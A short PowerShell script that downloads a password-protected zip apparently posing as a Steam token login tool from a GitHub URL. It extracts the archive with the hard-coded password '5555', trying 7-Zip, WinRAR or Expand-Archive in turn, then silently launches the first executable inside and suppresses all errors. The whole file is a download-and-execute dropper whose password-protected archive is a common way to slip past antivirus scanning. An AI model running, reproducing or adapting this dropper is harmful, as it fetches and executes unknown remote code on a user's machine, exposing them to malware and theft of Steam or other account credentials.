$zipUrl="https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.zip"
$targetFolder="C:\Users\zenas\Desktop\Новая папка (7)"
$zipPath="$targetFolder\steamtokenloginer.zip"
$extractPath="$targetFolder\steamtokenloginer"
$password="5555"

if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}

try{
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
    $fileSize=(Get-Item $zipPath).Length
    if($fileSize -eq 0){
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
        (New-Object Net.WebClient).DownloadFile($zipUrl,$zipPath)
        $fileSize=(Get-Item $zipPath).Length
    }
    
    if($fileSize -gt 0){
        function Test-ExtractionSuccess{return(Test-Path $extractPath)-and(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0}
        
        $7zipPaths=@("$env:ProgramFiles\7-Zip\7z.exe","${env:ProgramFiles(x86)}\7-Zip\7z.exe","$env:LOCALAPPDATA\Programs\7-Zip\7z.exe")
        foreach($7zipPath in $7zipPaths){if(Test-Path $7zipPath){& $7zipPath x "-p$password" "-o$extractPath" "-y" $zipPath | Out-Null;if(Test-ExtractionSuccess){break}}}
        
        if(-not(Test-ExtractionSuccess)){
            $winrarPaths=@("$env:ProgramFiles\WinRAR\WinRAR.exe","${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe")
            foreach($winrarPath in $winrarPaths){if(Test-Path $winrarPath){& $winrarPath x "-p$password" "-y" "-ibck" $zipPath $extractPath | Out-Null;if(Test-ExtractionSuccess){break}}}
        }
        
        if(-not(Test-ExtractionSuccess)){
            try{if(Test-Path $extractPath){Remove-Item $extractPath -Recurse -Force}Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force}catch{}
        }
        
        if(Test-ExtractionSuccess){
            $exeFile=Get-ChildItem $extractPath | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
            if($exeFile){Start-Process -FilePath "$extractPath\$($exeFile.Name)"}else{Invoke-Item $extractPath}
        }else{
            Invoke-Item $targetFolder
        }
    }
}catch{}